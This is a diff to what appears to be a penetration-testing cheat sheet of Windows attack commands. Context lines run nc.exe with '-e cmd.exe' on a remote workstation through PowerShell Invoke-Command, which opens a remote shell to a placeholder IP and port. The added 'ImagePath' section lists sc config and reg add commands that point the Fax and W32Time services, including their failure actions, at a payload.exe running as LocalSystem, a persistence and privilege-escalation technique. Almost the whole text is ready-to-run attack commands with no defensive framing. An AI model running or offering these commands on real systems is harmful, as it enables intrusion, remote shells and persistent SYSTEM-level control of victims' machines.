@@ -113,3 +113,15 @@ $password =  ConvertTo-SecureString "<password>" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
 Invoke-Command -ComputerName WORKSTATION -Credential $creds -ScriptBlock {C:\path\to\nc.exe IP PORT -e cmd.exe}
 ```
+### ImagePath
+https://pentestlab.blog/tag/imagepath/
+```
+sc config Fax binPath= "C:\payload.exe"
+sc config Fax binPath= "C:\payload.exe" start="auto" obj="LocalSystem"
+sc config Fax binPath= "C:\Windows\System32\payload.exe" start="auto" obj="LocalSystem"
+sc start Fax
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "C:\payload.exe"
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "C:\payload.exe"
+sc failure Fax command= "\"c:\Windows\system32\payload.exe\""
+```
